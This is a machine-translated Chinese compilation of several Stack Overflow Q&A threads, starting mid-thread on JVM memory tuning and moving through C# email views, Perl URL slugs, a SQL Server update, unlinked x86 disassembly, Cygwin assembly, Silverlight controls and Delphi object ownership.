> 众所周知，常驻内存会以类似于内存泄漏或内存碎片的方式蠕动。

还有一个开放的 JDK 错误[JDK-8193521 “glibc 默认配置会浪费内存”](https://bugs.openjdk.java.net/browse/JDK-8193521)

在 Google 或 SO 上搜索 MALLOC_ARENA_MAX 以获取更多参考。

您可能还想调整其他 malloc 选项以优化分配内存的低碎片：

```
# tune glibc memory allocation, optimize for low fragmentation
# limit the number of arenas
export MALLOC_ARENA_MAX=2
# disable dynamic mmap threshold, see M_MMAP_THRESHOLD in "man mallopt"
export MALLOC_MMAP_THRESHOLD_=131072
export MALLOC_TRIM_THRESHOLD_=131072
export MALLOC_TOP_PAD_=131072
export MALLOC_MMAP_MAX_=65536 
```

* * *

## 回答 #3

> 赞同：10
> 
> 时间：2009-02-18T16:21:52.190

为 Java 进程分配的内存量与我的预期相当。我在嵌入式/内存有限的系统上运行 Java 时遇到了类似的问题。运行具有任意 VM 限制或在没有足够交换量的系统上运行的任何应用程序往往会中断*。*这似乎是许多现代应用程序的本质，它们不是为在资源有限的系统上使用而设计的。

您还有更多选择可以尝试限制 JVM 的内存占用。这可能会减少虚拟内存占用：

> -XX:ReservedCodeCacheSize=32m 保留代码缓存大小（以字节为单位）- 最大代码缓存大小。[Solaris 64 位、amd64 和 -server x86：48m；在 1.5.0_06 及更早版本中，Solaris 64 位和 and64：1024m。]
> 
> -XX:MaxPermSize=64m 永久代的大小。[5.0 及更高版本：64 位 VM 的规模扩大了 30%；1.4 amd64：96m；1.3.1-客户端：32m。]

此外，您还应该将 -Xmx（最大堆大小）设置为尽可能接近应用程序***实际峰值内存使用量的值。***我相信 JVM 的默认行为仍然是每次将堆大小扩大到最大值时*翻倍。*如果您从 32M 堆开始并且您的应用程序达到 65M 的峰值，那么堆最终将增长 32M -> 64M -> 128M。

您也可以尝试这样做以使 VM 在增长堆方面不那么激进：

> -XX:MinHeapFreeRatio=40 GC 后堆空闲的最小百分比以避免扩展。

此外，根据我几年前的试验记忆，加载的本机库的数量对最小占用空间有巨大的影响。如果我没记错的话，加载 java.net.Socket 增加了超过 15M（我可能没有）。

* * *

## 回答 #4

> 赞同：8
> 
> 时间：2009-03-03T17:14:16.813

Sun JVM 需要大量内存用于 HotSpot，它映射到共享内存中的运行时库。

如果内存是一个问题，请考虑使用另一个适合嵌入的 JVM。IBM 有 j9，还有使用 GNU 类路径库的开源“jamvm”。Sun 还在 SunSPOTS 上运行 Squeak JVM，因此还有其他选择。

* * *

## 回答 #5

> 赞同：5
> 
> 时间：2015-01-16T07:21:06.360

减少资源有限的系统的堆空间的一种方法可能是使用 -XX:MaxHeapFreeRatio 变量。这通常设置为 70，并且是在 GC 收缩之前可用的堆的最大百分比。将其设置为较低的值，您将在例如 jvisualvm 分析器中看到较小的堆 sice 通常用于您的程序。

编辑：要为 -XX:MaxHeapFreeRatio 设置较小的值，您还必须设置 -XX:MinHeapFreeRatio 例如

```
java -XX:MinHeapFreeRatio=10 -XX:MaxHeapFreeRatio=25 HelloWorld 
```

EDIT2：为启动并执行相同任务的真实应用程序添加了一个示例，一个使用默认参数，一个使用 10 和 25 作为参数。我没有注意到任何真正的速度差异，尽管理论上 java 在后一个示例中应该使用更多时间来增加堆。

![默认参数](https://i.stack.imgur.com/VyPgR.png)

最后，最大堆为 905，已用堆为 378

![最小堆 10，最大堆 25](https://i.stack.imgur.com/CGaWo.png)

最后，最大堆为 722，已用堆为 378

这实际上有一些影响，因为我们的应用程序运行在远程桌面服务器上，许多用户可能会同时运行它。

* * *

## 回答 #6

> 赞同：4
> 
> 时间：2009-02-18T14:51:39.430

只是一个想法，但您可以检查[选项](http://osdir.com/ml/linux.debian.packages.java.devel/2005-08/msg00017.html)[的`ulimit -v`](http://osdir.com/ml/linux.debian.packages.java.devel/2005-08/msg00017.html)影响。

这不是一个实际的解决方案，因为它会限制*所有*进程可用的地址空间，但这将允许您使用有限的虚拟内存检查应用程序的行为。

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2009-02-18T14:35:14.820

Sun 的 java 1.4 有以下参数来控制内存大小：

> -Xmsn 指定内存分配池的初始大小，以字节为单位。此值必须是大于 1MB 的 1024 的倍数。附加字母 k 或 K 表示千字节，或附加 m 或 M 表示兆字节。默认值为 2MB。例子：
> 
> ```
>  -Xms6291456
>            -Xms6144k
>            -Xms6m 
> ```
> 
> -Xmxn 指定内存分配池的最大大小，以字节为单位。此值必须是大于 2MB 的 1024 的倍数。附加字母 k 或 K 表示千字节，或附加 m 或 M 表示兆字节。默认值为 64MB。例子：
> 
> ```
>  -Xmx83886080
>            -Xmx81920k
>            -Xmx80m 
> ```

[http://java.sun.com/j2se/1.4.2/docs/tooldocs/windows/java.html](http://java.sun.com/j2se/1.4.2/docs/tooldocs/windows/java.html)

Java 5 和 6 还有更多。请参阅[http://java.sun.com/javase/technologies/hotspot/vmoptions.jsp](http://java.sun.com/javase/technologies/hotspot/vmoptions.jsp)

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2009-02-18T14:28:52.307

不，您无法配置 VM 所需的内存量。但是，请注意，这是虚拟内存，而不是常驻内存，因此如果不实际使用，它只会留在那里而不会造成伤害。

或者，您可以尝试其他一些 JVM，然后是 Sun 的，内存占用更小，但我在这里不建议。

# c# - System.Net.Mail AlternateViews 丢失纯文本数据

> ID：561248
> 
> 赞同：2
> 
> 时间：2009-02-18T14:25:18.243
> 
> 标签：c#, .net, email

我正在尝试发送一封带有纯文本正文和备用 html 正文的电子邮件。但是，当我通过网络窥探数据时，电子邮件的文本部分会丢失。

这是我的编码尝试示例。

```
private static MailMessage BuildEmail(string plainText, string htmlBody)
{
    // Add the alternate body to the message.
    ContentType HtmlContentType = new ContentType("text/html");
    AlternateView alternate = AlternateView.CreateAlternateViewFromString(htmlBody, HtmlContentType);

    ContentType PlainContentType = new ContentType("text/plain");
    AlternateView PlainView = AlternateView.CreateAlternateViewFromString(plainText, PlainContentType);

    MailMessage mail = new MailMessage(new MailAddress(ToEmail_DEFAULT),
        new MailAddress(FromEmail_DEFAULT));

    mail.Subject = "First plain. Html next";
    mail.AlternateViews.Add(PlainView);
    mail.AlternateViews.Add(alternate);

    return mail;
} 
```

* * *

[http://www.my914.net/images/work/emailProblem.jpg](http://www.my914.net/images/work/emailProblem.jpg)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-03-12T16:40:09.037

问题最终是网络侦听应用程序。获取最新版本的应用程序让我看到发送到 SMTP 服务器的数据是正确的，并且包含我的纯文本视图和 html 文本视图。

# search-engine - 在 URLS 中表示非 ASCII 字符可以在搜索引擎中提供更好的页面排名？

> ID：561254
> 
> 赞同：0
> 
> 时间：2009-02-18T14:25:47.883
> 
> 标签：search-engine, friendly-url

世界大部分地区使用非 ASCII 字符。但有些习语使用 é、ö、á、ã、õ 等，可以“转换”为 ascii。

假设帖子的标题是：

```
配置和功能！
```

如何在 URL 中表示它？

```
www.myblog.com/post/1200/Configura__o-_-f_cil
```

一个更好的表示是

```
www.myblog.com/post/1200/Configuracao-e-facil
```

[维基百科在http://en.wikipedia.org/wiki/Deja_vu](http://en.wikipedia.org/wiki/Deja_vu)中这样做

这会提高搜索引擎中的页面排名吗？

如何用你最喜欢的语言做到这一点？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-02-18T14:31:41.863

# 在 Perl 中

使用 [Text::Unidecode](http://search.cpan.org/~sburke/Text-Unidecode-0.04/lib/Text/Unidecode.pm)：

```
#!/usr/bin/perl -w

use utf8;
use Text::Unidecode;
print unidecode(
    "áéíóú\n"
);

# That prints: aeiou 
```

# sql - 通过从多个表中提取信息来更新表

> ID：561259
> 
> 赞同：0
> 
> 时间：2009-02-18T14:27:41.670
> 
> 标签：sql

我尝试了下面的语句，但它不起作用。查询分析器返回“(0) 行受影响”。好消息......它没有爆炸......坏消息......我不知道声明有什么问题。

我想我正在使用 SQL Server 2000。我还没有在我的演示数据库上尝试过该语句。第二个语句是将旧的 oillab (oillabid=4) 更新为新的 oillab (oillabid=9)。oillabid 映射到 oillabstatus 表中正在更改的 oillabstatusid。

我想通过customerid更新oildatasetstatus表中的oildatasetstatusid。为了获取customerid，我需要从oildataset 表中获取oildatasetid（映射到oildatasetstatus 表）和samplepointid。samplepointid 映射到同样包含 customersiteid 的 samplepoint 表。customersiteid 映射到包含customerid 的customerssite 表。更新完成后，我需要更新 oildataset 表中的 oillabid。我猜这必须使用两个语句来完成（如下所示）。这些陈述看起来正确还是有任何明显的错误？无论如何要在一份声明中完成这两项更新吗？谢谢。

```
update  oildatasetstatus set oildatasetstatusid = 
case 
       WHEN oildatasetstatusid = 5 THEN 16
            WHEN oildatasetstatusid = 6 THEN 17
            WHEN oildatasetstatusid = 7 THEN 18
            WHEN oildatasetstatusid = 8 THEN 18
            WHEN oildatasetstatusid = 9 THEN 18
            WHEN oildatasetstatusid = 10 THEN 19
               WHEN oildatasetstatusid = 11 THEN 20
End    
where oildatasetid in
(
select oildatasetstatusid from oildatasetstatus 
 inner join oildataset on oildataset.oildatasetid=oildatasetstatus.oildatasetid
where samplepoinid in
    (
    select samplepointid from samplepoint where customersiteid in
        (
        select customersiteid from customersite where customerid=2
        )
    )
)

update oildataset set oillabid=9 where oildatasetstatusid between 16 and 20 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2009-02-18T15:52:13.010

如何将其分解并测试您是否获得了正确的结果并逐渐将它们组合在一起？

初始 UPDATE 的 WHERE 条件（编辑为具有 INNER JOIN 而不是 SELECT IN）并且还选择**了 oildatasetid 而不是 oildatasetstatusid**：

```
SELECT oildatasetid FROM oildatasetstatus
INNER JOIN oildataset
    ON oildataset.oildatasetid = oildatasetstatus.oildatasetid
INNER JOIN samplepoint
    ON oildatasetstatus.samplepoinid = samplepoint.samplepointid
INNER JOIN customersite
    ON samplepoint.customersiteid = customersite.customersiteid
WHERE customerid = 2; 
```

这应该返回与您的查询相同的 oildatasetid 列表，但运行速度更快。

现在是 UPDATE 语句：

```
UPDATE oildatasetstatus SET oildatasetstatusid = 
    CASE
        WHEN oildatasetstatusid = 5 THEN 16
        WHEN oildatasetstatusid = 6 THEN 17
        WHEN oildatasetstatusid = 7 THEN 18
        WHEN oildatasetstatusid = 8 THEN 18
        WHEN oildatasetstatusid = 9 THEN 18
        WHEN oildatasetstatusid = 10 THEN 19
        WHEN oildatasetstatusid = 11 THEN 20
    END
WHERE oildatasetid IN (
    SELECT oildatasetid FROM oildatasetstatus
    INNER JOIN oildataset
        ON oildataset.oildatasetid = oildatasetstatus.oildatasetid
    INNER JOIN samplepoint
        ON oildatasetstatus.samplepoinid = samplepoint.samplepointid
    INNER JOIN customersite
        ON samplepoint.customersiteid = customersite.customersiteid
    WHERE customerid = 2
); 
```

除非绝对必要，否则我会避免 BETWEEN：

```
UPDATE oildataset SET oillabid = 9 WHERE oildatasetstatusid >= 16 AND oildatasetstatusid <= 20; 
```

# assembly - 递归汇编调用虽然源代码中没有递归

> ID：561265
> 
> 赞同：0
> 
> 时间：2009-02-18T14:28:56.737
> 
> 标签：assembly, instructions

我有一个来自转储的代码片段，我想了解它。最困扰我的是（看似）递归调用，例如

bd604: e8 fc ff ff ff 调用 bd605 + 0xb5

他们在做什么？我不在原始函数中使用递归。

> 谢谢@schnaader
> 
> 似乎呼叫使 cld 并跳转到 EAX

编辑：我的功能的完整 dmp

```
00bd550 <SendData>:
SendData():
   bd550:   55                      push   %ebp
   bd551:   57                      push   %edi
   bd552:   56                      push   %esi
   bd553:   53                      push   %ebx
   bd554:   83 ec 20                sub    $0x20,%esp
   bd557:   8b 35 74 a2 06 00       mov    0x6a274,%esi
   bd55d:   8b 1d ac a2 06 00       mov    0x6a2ac,%ebx
   bd563:   dd 44 24 40             fldl   0x40(%esp,1)
   bd567:   66 c7 44 24 0e 00 00    movw   $0x0,0xe(%esp,1)
   bd56e:   83 eb 18                sub    $0x18,%ebx
   bd571:   85 f6                   test   %esi,%esi
   bd573:   dd 5c 24 18             fstpl  0x18(%esp,1)
   bd577:   dd 44 24 48             fldl   0x48(%esp,1)
   bd57b:   dd 5c 24 10             fstpl  0x10(%esp,1)
   bd57f:   0f 85 b2 00 00 00       jne    bd637 <SendData+0xe7>
   bd585:   8b 7c 24 38             mov    0x38(%esp,1),%edi
   bd589:   89 dd                   mov    %ebx,%ebp
   bd58b:   c1 fd 02                sar    $0x2,%ebp
   bd58e:   85 ff                   test   %edi,%edi
   bd590:   0f 8e 99 00 00 00       jle    bd62f <SendData+0xdf>
   bd596:   8d 76 00                lea    0x0(%esi),%esi
   bd599:   8d bc 27 00 00 00 00    lea    0x0(%edi,1),%edi
   bd5a0:   0f b7 74 24 0e          movzwl 0xe(%esp,1),%esi
   bd5a5:   39 ef                   cmp    %ebp,%edi
   bd5a7:   89 e8                   mov    %ebp,%eax
   bd5a9:   0f 4e c7                cmovle %edi,%eax
   bd5ac:   dd 44 24 18             fldl   0x18(%esp,1)
   bd5b0:   89 c5                   mov    %eax,%ebp
   bd5b2:   8d 1c ad 00 00 00 00    lea    0x0(,%ebp,4),%ebx
   bd5b9:   29 ef                   sub    %ebp,%edi
   bd5bb:   01 c6                   add    %eax,%esi
   bd5bd:   a1 a8 a2 06 00          mov    0x6a2a8,%eax
   bd5c2:   8d 56 ff                lea    0xffffffff(%esi),%edx
   bd5c5:   dd 58 08                fstpl  0x8(%eax)
   bd5c8:   66 89 50 06             mov    %dx,0x6(%eax)
   bd5cc:   0f b7 54 24 0e          movzwl 0xe(%esp,1),%edx
   bd5d1:   66 89 50 04             mov    %dx,0x4(%eax)
   bd5d5:   8b 54 24 3c             mov    0x3c(%esp,1),%edx
   bd5d9:   89 10                   mov    %edx,(%eax)
   bd5db:   dd 44 24 10             fldl   0x10(%esp,1)
   bd5df:   dd 58 10                fstpl  0x10(%eax)
   bd5e2:   8b 54 24 34             mov    0x34(%esp,1),%edx
   bd5e6:   0f bf 44 24 0e          movswl 0xe(%esp,1),%eax
   bd5eb:   89 5c 24 08             mov    %ebx,0x8(%esp,1)
   bd5ef:   83 c3 18                add    $0x18,%ebx
   bd5f2:   8d 04 82                lea    (%edx,%eax,4),%eax
   bd5f5:   89 44 24 04             mov    %eax,0x4(%esp,1)
   bd5f9:   a1 a8 a2 06 00          mov    0x6a2a8,%eax
   bd5fe:   83 c0 18                add    $0x18,%eax
   bd601:   89 04 24                mov    %eax,(%esp,1)
   bd604:   e8 fc ff ff ff          call   bd605 <SendData+0xb5>
   bd609:   a1 a8 a2 06 00          mov    0x6a2a8,%eax
   bd60e:   c7 44 24 08 00 00 00    movl   $0x0,0x8(%esp,1)
   bd615:   00
   bd616:   89 5c 24 04             mov    %ebx,0x4(%esp,1)
   bd61a:   89 04 24                mov    %eax,(%esp,1)
   bd61d:   e8 fc ff ff ff          call   bd61e <SendData+0xce>
   bd622:   85 ff                   test   %edi,%edi
   bd624:   66 89 74 24 0e          mov    %si,0xe(%esp,1)
   bd629:   0f 8f 71 ff ff ff       jg     bd5a0 <SendData+0x50>
   bd62f:   83 c4 20                add    $0x20,%esp
   bd632:   5b                      pop    %ebx
   bd633:   5e                      pop    %esi
   bd634:   5f                      pop    %edi
   bd635:   5d                      pop    %ebp
   bd636:   c3                      ret   
   bd637:   dd 44 24 18             fldl   0x18(%esp,1)
   bd63b:   dd 1c 24                fstpl  (%esp,1)
   bd63e:   e8 fc ff ff ff          call   bd63f <SendData+0xef>
   bd643:   85 c0                   test   %eax,%eax
   bd645:   74 e8                   je     bd62f <SendData+0xdf>
   bd647:   e9 39 ff ff ff          jmp    bd585 <SendData+0x35>
   bd64c:   8d 74 26 00             lea    0x0(%esi,1),%esi 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-25T14:46:46.653

您可能通过反汇编目标文件 (.o) 得到了这个转储。正如[这里在 OSDev 上](http://wiki.osdev.org/Object_Files)提到的，`e8 fc ff ff ff`序列对应于链接阶段之前的函数调用，在您调用的函数的最终地址（在可执行文件中）已知之前。在这个阶段，有关此调用的目的地的信息存储在目标文件的重定位表中，等待链接器将可执行文件放在一起。

为避免此问题，您应该分析最终可执行文件的转储，而不是目标文件之一的转储。在这里，链接器的工作将完成，CALL 操作数将对应于它们的真实目的地。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-02-18T14:51:54.153

使用[GRDB](http://members.tripod.com/~ladsoft/grdb.htm)（实模式调试器），这将转换为“调用 -1”，因此 bd603 处的字节将确定将执行哪个命令。例如，如果此字节为 FF，则下一个命令将是“jmp ax”，它可能会递归。

无论如何，这看起来更像是一些反调试/自我修改的代码，而不是真正有意义的。

# assembly - Cygwin：汇编语言开发？

> ID：561273
> 
> 赞同：5
> 
> 时间：2009-02-18T14:31:36.997
> 
> 标签：assembly, cygwin

首先，我不确定这是否应该是我昨天在[组装和堆栈](https://stackoverflow.com/questions/556714/assembly-language-the-stack)上开始的线程的一部分，但我认为我在这里提出的问题完全不同。

我一直试图通过维基百科和谷歌了解[Cygwin](http://en.wikipedia.org/wiki/Cygwin)到底是什么，但我运气不佳。我刚刚开始使用 gcc gas 汇编器在 Linux 上进行汇编编程。我在午餐时使用一台只有 Windows 的机器。我想在这里练习一些汇编语言编程，所以我认为 Cygwin 可能会有所帮助。

我错误地认为我在 Linux 中编写的代码可以使用 Cygwin 在 Windows 中编译和运行。Cygwin 允许我很好地编译代码：

```
as someAssmProg.as -o someAssmProg.o
ld someAssmProg.o -o someAssmProg 
```

但是如果我尝试在 Cygwin 下运行代码，

```
./someAssmProg 
```

我收到“发生未处理的 win32 异常”消息

现在我假设这是因为我正在编写的代码是针对 Linux 的。我以为 Cygwin 会处理这个问题。Cygwin 真的只是用来以 Unix 风格的命令行方式开发 Windows 应用程序吗？

我再次知道这对这里的大多数人来说可能是显而易见的，但我真的很困惑！

PS 我之前在 Windows 上尝试过[AndLinux](http://www.andlinux.org/)，但安装量很大。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2009-02-18T14:37:47.853

Cygwin 是一个运行时层，它在 Windows 上提供来自 Unix/Linux 世界的库和软件。它不会让你的汇编代码运行，因为操作系统仍然是 Windows，所以所有的中断等仍然是 Windows，而不是 Linux 版本。此外，如果您真的想在 Windows 上运行汇编程序，您必须做的事情与在 Linux（或 DOS，就此而言）中做的事情有很大不同。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2009-02-24T00:24:41.680

您可以完全在 Cygwin 中运行汇编程序。`main`我猜你的加载失败了，因为在 Windows 执行进程和你到达函数之间必须发生很多事情。当 gcc 以汇编为输入时，它将链接到适当的样板代码以生成有效的可执行文件。

这是一个示例汇编程序。将其保存为 hello.s：

```
.intel_syntax noprefix

.section .text

.globl _main
_main:
        enter 0, 0

        // welcome message
        push    OFFSET s_HelloWorld
        call    _printf
        pop     eax

        // add three numbers
        push    2
        push    4
        push    5
        call    _addThree
        add     esp, 3 * 4

        // print returned value
        push    eax
        push    OFFSET s_PercentD
        call    _printf
        add     esp, 2 * 4

        xor     eax, eax
        leave
        ret

// Add three numbers
_addThree:
       enter    0, 0
       mov      eax, DWORD PTR [ebp + 8]
       add      eax, DWORD PTR [ebp + 12]
       add      eax, DWORD PTR [ebp + 16]
       leave
       ret

.section .rdata

s_HelloWorld:
       .ascii  "Hello, world.\n\0"
s_PercentD:
       .asciz "%d\n" 
```

然后运行它

```
$ gcc -mno-cygwin hello.s -o hello && ./hello
Hello, world.
11 
```

[AMD64 Architecture Programmer's Manual](http://developer.amd.com/documentation/guides/Pages/default.aspx)中包含处理器汇编指令的参考。C 调用约定记录在Internet 档案的[此页面中；](http://web.archive.org/web/20050208123742/http://ocliteracy.com/techtips/win32-callconv-asm.html)也许你能找到一个仍然有图像的类似的？

请注意，Cygwin 现在只能进行 32 位汇编；（非消费者）世界现在都是 64 位的，在现代处理器上的 64 位模式下，您有更多的寄存器和不同的调用约定。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-02-18T15:39:19.907

真正做到这一点的*最好方法是安装一个虚拟机（使用 VirtualBox 或类似的），并在其下安装完整的 Linux。*听起来这可能太重而无法满足您的要求，但这是我目前唯一的建议。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2017-03-23T17:16:12.227

嗨，我有一个类似的问题，但能够在这个 cygwin 会话中使用 -mconsole 选项来解决这个问题，首先编译文件 foo.c，然后使用 gdb 调试器运行，我希望这会对你有所帮助

```
$ cat foo.c
int main( void )
{
        __asm__ ( "mov $5, %rax" );
        return 0;
}
$ make
gcc -ggdb -Wall -mconsole -o foo.o -c foo.c
gcc -ggdb -o foo foo.o -lm
$ gdb ./foo.exe
GNU gdb (GDB) (Cygwin 7.10.1-1) 7.10.1
Copyright (C) 2015 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-pc-cygwin".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from ./foo.exe...done.
(gdb) l
1       int main( void )
2       {
3               __asm__ ( "mov $5, %rax" );
4               return 0;
5       }
(gdb) b 3
Breakpoint 1 at 0x1004010ed: file foo.c, line 3.
(gdb) r
Starting program: /cygdrive/c/C++/C/foo.exe
[New Thread 6724.0x13d0]
[New Thread 6724.0x1890]
[New Thread 6724.0x8e0]
[New Thread 6724.0xd84]

Breakpoint 1, main () at foo.c:3
3               __asm__ ( "mov $5, %rax" );
(gdb) info registers rax
rax            0x0      0
(gdb) s
4               return 0;
(gdb) info registers rax
rax            0x5      5
(gdb) c
Continuing.
[Thread 6724.0x1890 exited with code 0]
[Thread 6724.0x8e0 exited with code 0]
[Thread 6724.0xd84 exited with code 0]
[New Thread 6724.0x1368]
[Inferior 1 (process 6724) exited normally]
(gdb) 
```

# silverlight - 如何在 Silverlight 中制作自定义控件？

> ID：561281
> 
> 赞同：1
> 
> 时间：2009-02-18T14:32:52.233
> 
> 标签：silverlight, xaml, custom-controls

我使用 Expression Blend 创建了一个自定义控件：

```
<UserControl
    xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
    xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
    xmlns:d="http://schemas.microsoft.com/expression/blend/2008"
    xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006"
    mc:Ignorable="d"
    x:Class="MyProject.EditableField"
    d:DesignWidth="286" d:DesignHeight="20">

    <Grid x:Name="LayoutRoot">
        <TextBlock HorizontalAlignment="Left" Width="95" Text="Label:" TextWrapping="Wrap" x:Name="Label" FontSize="12"/>
        <TextBox Margin="99,0,0,0" x:Name="Value" Text="Value" TextWrapping="Wrap"/>
    </Grid>
</UserControl> 
```

它包含一个 TextBlock 标签和一个 TextBox 值。我想要的是使用它们自己的标签和值将其中的多个添加到我的 XAML 中，可能是这样的：

```
<MyProject:EditableField Margin="30,180,0,0" Height="20" HorizontalAlignment="Left" VerticalAlignment="Top" Width="286" x:Name="FaxNumber">
            <Label>
                <Text>Fax number:</Text>
            </Label>
            <Value>
                <Contents>
                    111-222-333
                </Contents>
            </Value>
        </MyProject:EditableField> 
```

当我说也许，这显然是行不通的。添加它们的正确语法是什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-02-18T14:58:47.697

最简单的方法是在后面的代码中添加两个新属性，例如 LabelText 和 ContentText。将它们连接起来以分别设置和获取 TextBlock 控件和 TextBox 控件的 Text 属性。

然后你会使用：

```
<MyProject:EditableField LabelText="Fax number:" ContentText="111-222-333" ... 
```

正确的方法是这样做，实现两个依赖属性（从而支持动画、数据绑定等），并将子控件的控件文本绑定到这些属性。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-02-18T15:41:12.990

在后面的代码中：

```
public string LabelText
{
    get { return Label.Text; }
    set { Label.Text = value; }
}

public string ContentText
{
    get { return Value.Text; }
    set { Value.Text = value; }
} 
```

# delphi - 如何从 Delphi 中的函数返回对象而不导致访问冲突？

> ID：561282
> 
> 赞同：14
> 
> 时间：2009-02-18T14:33:08.367
> 
> 标签：delphi

我有一个返回 TStringList 的 delphi 函数，但是当我返回一个值并尝试使用它时，我得到一个访问冲突错误，即

```
myStringList := FuncStringList();
myStringList.Items.Count   // <-- This causes an access violation

// function FuncStringList
function FuncStringList:TStringList;
var
  vStrList:TStringList;
begin

  vStrList := TStringList.Create;
   ...
  // Fill the vStrList

  Result := vStrList 
  vStrList.Free;    //<- when i free here, this function will cause AccessViolation
end; 
```

如何返回 TStringList 并仍然在本地函数中释放它？

* * *

## 回答 #1

> 赞同：30
> 
> 时间：2009-02-18T14:44:08.683

正如 Smasher 所说，您无法释放它；调用返回对象的函数的代码负责销毁它。

顺便说一句，这是一个糟糕的代码设计，因为它让人混淆了谁分配和释放。一个更好的方法是让调用者创建对象并将其传递给函数。这样，创建它的代码也会释放它。像这样的东西：

```
var
  SL: TStringList;
begin
  SL := TStringList.Create;
  try
    ProcToFillStringList(SL);
    //Do something with populated list
  finally
    SL.Free;
  end;
end;

// Note I've made the parameter a TStrings and not a TStringList. This allows
// passing a TMemo.Lines or a TListBox or TComboBox Items as well.
procedure ProcToFillStringList(const SList: TStrings);
  // Do whatever populates the list with SList.Add()
end; 
```

现在对于谁在做什么没有混淆 - 创建对象的相同代码负责释放它。并且代码 IMO 更易于阅读和维护。

* * *

## 回答 #2

> 赞同：27
> 
> 时间：2009-02-18T14:37:48.527

> 我怎样才能返回 TStringList 并仍然在本地函数中释放它？

你不能。如果在本地函数中释放它，则不能使用返回值。Result 和 vStrList 指向内存中的同一个 TStringList 对象。TStringList 是一个类，并且

```
Result := vStrList 
```

因此不复制字符串列表，而只复制引用。

因此，您应该在完成处理后释放调用上下文中的字符串列表，或者将字符串列表作为参数传递给您的函数，如下所示

```
procedure FuncStringList (StringList : TStringList); 
```

并让调用代码创建并释放字符串列表。正如其他答案所指出的，这是更可取的方式，因为它使所有权非常明确。

* * *

## 回答 #3

> 赞同：6
> 
> 时间：2009-02-18T14:41:22.107

简单的答案：你不能。你为什么要这么做？是因为你已经知道你需要释放你在创建它们的同一个函数中创建的每个对象吗？这通常是正确的，但并非总是如此，这是该规则的例外情况之一。更好的说法是每个对象都必须由其所有者释放。

如果您有一个生成对象的函数，例如这个，然后将其传递给另一个函数，则它不会获得该对象的所有权。删除对 free 的调用并记录它，因此您（以及使用此函数的任何其他人）将意识到它创建了一个新对象，调用它的代码必须拥有该对象。

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2011-02-16T17:06:36.763

**简单的答案（附例子）：**

当你这样做

> 结果：= vStrList

您将 vStrList 分配给 Result。此时 vStrList 和 Result是一回事**！**所以，在下一行代码中，当你释放 vStrList 时，你也释放了 Result（嗯，这在技术上并不准确，但我用它来保持解释的简单）。这就是为什么当您尝试使用该函数的结果时会得到一个 AV。释放 vStrList 时，Result 被销毁。

因此，这将解决您的问题：

```
function FuncStringList:TStringList;
begin
  Result := TStringList.Create;
  // Do stuff with Result
  // never free (here, in this function) the Result
end; 
```

FuncStringList 的调用者必须释放“结果”。

你这样称呼它：

```
myStringList := FuncStringList;
try 
  myStringList.Items.Count                      
finally
  FreeAndNil(myStringList);    <------------- NOW you can free "Result"
end; 
```

.

**另一个例子：**

```
function makelist: tstringlist;
begin
  result := Tstringlist.create;
  result.add('1');
  result.add('2');
end;

procedure TForm1.Button_GOOD_Click(Sender: TObject);
var list : tstringlist;
begin
  list := makelist;
  DoStuff(list);
  list.free;      //ok
end;

procedure TForm1.Button_BAD_Click(Sender: TObject);
begin
  listbox1.items.Assign(makelist);  // <---- memory leak here because you forgot to free
end; 
```

* * *

在任何人开始“挑选”我的解释之前，我把这个注释放在这里。为了避免复杂的概念（例如指针分配），我在解释中使用了一些“快捷方式”，使事情变得非常简单。@gath 提出了一个基本问题，这意味着他仍在学习编程的基础知识。

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2009-02-18T14:38:31.580

您根本无法释放某些东西，然后期望稍后引用它。那是错误的方式。您有两个基本选择：

*   不要免费调用，并让调用者负责处理对象
*   让调用者传入一个对象，以便它负责 Create 和 Free

第一个选项看起来更简单，使函数的接口更小，等等。第二个选项使使用更不容易出错，因为它负责管理对象的调用者很直观。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2009-02-18T14:38:10.663

在调用对象上的方法之前不要释放对象。您当前正在对已破坏的对象调用 Count 方法，因此出现错误。

为什么不在调用函数中创建字符串列表，并将其引用传递给填充它的方法？或者让字符串列表成为一个类的成员，并在释放拥有它的类时释放它？

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2009-02-18T15:10:32.363

另一种可能性是使用动态数组而不是 TStringList。由于数组是引用计数的，因此您永远不必担心释放它。

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2009-02-26T18:38:16.183

我在这种情况下的策略是通过 text 属性传递字符串列表内容，并将返回的字符串传递给函数。这样就没有必要讨论谁释放谁了。当然，你必须做更多的编码，但它更安全。该示例是对 Ken White 的改编：

```
var
  SL: TStringList;
  Aux: String;
begin
  SL := TStringList.Create;
  try
    SL.Text := ProcToFillStringList;
    //Do something with populated list
  finally
    SL.Free;
  end;
end;

 // It receives a default param, in the case you have to deal with 
 // StringList with some previous content    
 function ProcToFillStringList(SListContent: String = ''):String;
 // Do the stuff you need to do with the content
end; 
```

一个例外是，当您拥有的只是对象并且无法通过安全类型（在本例中为字符串）检索其内容时；然后我按照肯怀特的想法。

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2013-10-23T05:31:42.077

两者都引用相同的内存，如果你释放它，它们都会被释放.......

